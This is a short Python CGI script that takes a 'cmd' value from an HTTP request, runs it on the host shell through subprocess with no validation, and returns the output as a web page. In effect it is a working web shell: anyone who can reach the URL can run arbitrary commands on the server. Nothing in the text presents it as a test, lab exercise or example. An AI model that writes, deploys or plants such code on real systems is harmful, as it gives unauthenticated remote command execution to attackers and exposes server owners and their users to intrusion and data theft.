#!/bin/python3
print("content:text/html")
print()

import cgi
import subprocess
data=cgi.FieldStorage()
command=data.getvalue("cmd")
print(command)
output=subprocess.getstatusoutput("{}".format(command))
print(output[1])
